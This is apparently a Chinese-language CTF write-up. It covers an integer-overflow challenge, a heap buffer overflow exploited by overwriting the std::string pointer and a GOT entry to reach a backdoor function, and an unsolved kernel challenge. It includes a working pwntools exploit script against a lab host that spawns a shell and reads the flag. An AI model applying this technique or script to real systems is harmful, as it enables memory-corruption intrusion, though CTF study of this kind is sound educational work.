# KFC crazy Thursday

整形溢出，算一下pow(2,31)//99999=21，随手填个22就过了。

# Buffer overflow in heap

这道题要了解string的结构，如下：
```cpp
struct str{
    union _Bxty { // std::string同一时间只可能是短字符串或长字符串
        char _Buf[16]; // 长度小于16时候用这个
        char* _Ptr; // 长度大于16时候就是指针
        char _Alias[16]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
    } _Bx;

    std::size_t _Mysize = 0; // 字符串当前长度
    std::size_t _Myres = 0; // 当前字符串最大长度
}
```
所以我们只需要初始化一个长度大于16的字符串，覆盖最靠前的_Ptr即可达到任意地址读/写

因为程序没开随机化和FULL RELRO，可以改会碰到的函数的got表为后门函数直接getshell。

注意几点就是：
- cin默认的分隔符是空格和换行，要保证payload里没这两个字符
- cin>>和gets一样，会把末尾的分隔符替换为\x00，所以请预留好空间，不要让cin的截断覆盖了后边结构体的关键信息。
- 如果不初始化str也是可以的，这样就不需要考虑被覆盖的_Mysize位了


```python
from pwn import *

p = remote("10.20.55.12", 28024)

p.sendlineafter(b":", b"3")
p.sendlineafter(b":", b"b" * 17)  # 先搞个正常的就不用手动伪造了
p.sendlineafter(b":", b"1")
# 这里0x404048 0x404050 和 0x404080 都可以，延迟绑定只要碰到的就能打(?)
p.sendlineafter(b":", b'\x00' * 32 + p64(0x404050)[:-1])  # cin补0，我们不需要
p.sendlineafter(b":", b"3")
p.sendlineafter(b":", p64(0x4016e2))  # 0x4016de 也行，但e2就够og了
p.sendlineafter(b":", b"4")
p.sendlineafter(b"/", b"cat flag.txt")
p.interactive()

```

# Love Kernel

48h国际赛1解内核题，不会kernel，爬走